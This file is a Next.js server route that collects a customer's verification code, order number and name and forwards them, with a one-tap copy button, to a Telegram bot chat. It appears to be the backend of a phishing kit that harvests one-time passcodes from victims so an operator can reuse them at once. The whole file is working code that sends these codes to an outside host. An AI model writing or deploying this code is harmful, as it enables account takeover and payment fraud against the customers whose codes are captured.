import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { code, orderId, customerName } = await req.json();

  const text = [
    `🔐 كود تحقق جديد`,
    `🆔 رقم الطلب: ${orderId ?? "—"}`,
    `👤 اسم العميل: ${customerName ?? "—"}`,
    `📟 الكود: ${code}`,
  ].join("\n");

  await fetch(
    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text,
        reply_markup: {
          inline_keyboard: [
            [{ text: "📋 نسخ الكود", copy_text: { text: code } }],
          ],
        },
      }),
    }
  );

  return NextResponse.json({ ok: true });
}
